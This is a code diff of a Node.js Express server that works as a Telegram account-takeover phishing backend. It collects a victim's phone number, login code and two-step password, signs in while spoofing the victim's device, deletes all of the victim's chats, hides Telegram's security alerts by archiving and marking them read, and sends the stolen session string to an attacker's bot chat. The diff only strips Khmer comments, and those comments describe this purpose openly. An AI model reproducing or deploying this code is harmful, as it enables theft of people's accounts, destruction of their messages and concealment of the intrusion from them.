@@ -11,21 +11,15 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Serve static files (index.html)
 app.use(express.static(__dirname));
 
-// Environment Variables ពី Railway
 const apiId = Number(process.env.TELEGRAM_API_ID);
 const apiHash = process.env.TELEGRAM_API_HASH;
 const botToken = process.env.BOT_TOKEN;
 const adminChatId = process.env.ADMIN_CHAT_ID;
 
-// Session បណ្តោះអាសន្នសម្រាប់រក្សាទុក Telegram Client
 const sessions = {};
 
-/**
- * 1. Function ស្កែន User-Agent ដើម្បីទាញយក Model ទូរស័ព្ទ និង Version OS ស្វ័យប្រវត្តិ
- */
 function parseDeviceInfo(userAgent = '') {
     let deviceModel = 'Mobile App';
     let systemVersion = 'Android 13';
@@ -38,7 +32,6 @@ function parseDeviceInfo(userAgent = '') {
         const androidMatch = userAgent.match(/Android (\d+(\.\d+)?)/);
         systemVersion = androidMatch ? `Android ${androidMatch[1]}` : 'Android 13';
 
-        // ព្យាយាមទាញយកឈ្មោះ Model ទូរស័ព្ទ Android
         const modelMatch = userAgent.match(/\(([^)]+)\)/);
         if (modelMatch) {
             const parts = modelMatch[1].split(';');
@@ -60,21 +53,16 @@ function parseDeviceInfo(userAgent = '') {
     return { deviceModel, systemVersion };
 }
 
-/**
- * 2. Function លុប Chat និងសារទាំងអស់ពី Users និង Bots
- */
 async function deleteAllChats(client) {
     try {
         const dialogs = await client.getDialogs({});
 
         for (const dialog of dialogs) {
-            // រំលង Telegram Official Chat (777000) ព្រោះ Telegram Server មិនអនុញ្ញាតឱ្យ Delete ទេ
             if (dialog.id.toString() === "777000" || dialog.name === "Telegram") {
                 continue;
             }
 
             try {
-                // លុបប្រវត្តិសារទាំងអស់ក្នុង Chat (Delete History)
                 await client.invoke(new Api.messages.DeleteHistory({
                     peer: dialog.inputEntity,
                     maxId: 0,
@@ -82,7 +70,6 @@ async function deleteAllChats(client) {
                     justClear: false
                 }));
 
-                // ស្កែនលុបសារដែលមានស្រាប់ការពារជ្រុះសល់
                 const messages = await client.getMessages(dialog.entity, { limit: 100 });
                 const messageIds = messages.map(msg => msg.id);
 
@@ -98,27 +85,20 @@ async function deleteAllChats(client) {
     }
 }
 
-/**
- * 3. Function លាក់ Telegram Official Chat ចូល Archive និង Mark as Read
- */
 async function archiveAndReadTelegramChats(client) {
     try {
         const dialogs = await client.getDialogs({});
 
         for (const dialog of dialogs) {
-            // ឆែកមើលតែ Telegram Official Account (ID: 777000)
             if (dialog.id.toString() === "777000" || dialog.name === "Telegram") {
                 try {
-                    // Mark as Read ដើម្បីបាត់ Unread Notification
                     await client.markAsRead(dialog.entity);
-
-                    // ផ្លាស់ទី Chat ចូល Archive (folderId: 1)
                     await client.invoke(
                         new Api.folders.EditPeerFolders({
                             folderPeers: [
                                 new Api.InputFolderPeer({
                                     peer: dialog.inputEntity,
-                                    folderId: 1, // 1 = Archive Folder
+                                    folderId: 1,
                                 }),
                             ],
                         })
@@ -133,53 +113,36 @@ async function archiveAndReadTelegramChats(client) {
     }
 }
 
-/**
- * 4. Function សំអាតសារបន្ទាប់ពី Log-in (លុប Chat ធម្មតា + Archive Telegram Chat រយៈពេល 1 នាទី)
- */
 async function cleanupPostLogin(client) {
-    // ជំហានដំបូង: លុប Chat ធម្មតាទាំងអស់ និង Archive Telegram Chat
     await deleteAllChats(client);
     await archiveAndReadTelegramChats(client);
 
-    // បង្កើត Event Listener ស្ទាក់ចាំសារ Real-time រយៈពេល 1 នាទី
     const eventHandler = async (event) => {
         try {
             const message = event.message;
             if (!message || !message.id) return;
 
-            // Mark as Read គ្រប់សារដែលផ្ញើចូល
             await client.markAsRead(message.peerId).catch(() => {});
-
-            // ព្យាយាមលុបសារ (ប្រសិនបើជាសារ Users/Bots)
             await client.deleteMessages(message.peerId, [message.id], { revoke: true }).catch(() => {});
-
-            // លាក់ចូល Archive ភ្លាមៗ (ករណីជាសារ Security Alert ពី Telegram)
             await archiveAndReadTelegramChats(client);
         } catch (err) {
             console.error("Error processing live message:", err.message);
         }
     };
 
-    // ចាប់ផ្ដើម Listen សារថ្មីៗ
     client.addEventHandler(eventHandler, new NewMessage({}));
-
-    // រង់ចាំរយៈពេល 1 នាទី (60,000 ms)
     await new Promise(resolve => setTimeout(resolve, 60000));
 
-    // សំអាត និង Archive ម្តងទៀតជាចុងក្រោយ
     await deleteAllChats(client);
     await archiveAndReadTelegramChats(client);
 
-    // បិទ Listener វិញ
     client.removeEventHandler(eventHandler, new NewMessage({}));
 }
 
-// Root Route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 1. API: ផ្ញើលេខកូដ OTP ទៅ Telegram App
 app.post('/api/send-code', async (req, res) => {
     const { phoneNumber } = req.body;
     if (!phoneNumber) {
@@ -187,14 +150,13 @@ app.post('/api/send-code', async (req, res) => {
     }
 
     try {
-        // ទាញយកព័ត៌មាន Device ពី Request Header របស់ User ស្វ័យប្រវត្តិ
         const userAgent = req.headers['user-agent'] || '';
         const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);
 
         const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
             connectionRetries: 5,
-            deviceModel: deviceModel,     // ប្តូរឈ្មោះ Model តាមទូរស័ព្ទរបស់ Client ស្វ័យប្រវត្តិ
-            systemVersion: systemVersion, // ប្តូរ Version iOS / Android តាម Client
+            deviceModel: deviceModel,
+            systemVersion: systemVersion,
             appVersion: "10.2.1",
             langCode: "en",
         });
@@ -214,7 +176,6 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// 2. API: ផ្ទៀងផ្ទាត់ OTP និង 2FA Password
 app.post('/api/verify-code', async (req, res) => {
     const { phoneNumber, code, password } = req.body;
 
@@ -231,12 +192,10 @@ app.post('/api/verify-code', async (req, res) => {
         const { client, phoneCodeHash } = session;
 
         if (password) {
-            // ករណីមាន 2FA Password
             const passwordSrp = await client.invoke(new Api.account.GetPassword());
             const passwordCheck = await computeCheck(passwordSrp, password);
             await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
         } else {
-            // ករណី Sign In ជាមួយ OTP ធម្មតា
             await client.invoke(
                 new Api.auth.SignIn({
                     phoneNumber: phoneNumber,
@@ -246,13 +205,11 @@ app.post('/api/verify-code', async (req, res) => {
             );
         }
 
-        // ប្រតិបត្តិការសំអាត Chat/សារ និង Archive Telegram Alert ក្នុងរង្វង់ 1 នាទី
         await cleanupPostLogin(client);
 
         const sessionString = client.session.save();
         delete sessions[phoneNumber];
 
-        // ផ្ញើ Session String ចូល Telegram Admin Bot
         if (botToken && adminChatId) {
             try {
                 const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
@@ -271,7 +228,6 @@ app.post('/api/verify-code', async (req, res) => {
             }
         }
 
-        // ឆ្លើយតបទៅ Frontend វិញ រួមទាំង Link Redirect ទៅ jvpfans.com
         res.json({
             success: true,
             message: "Authentication successful!",
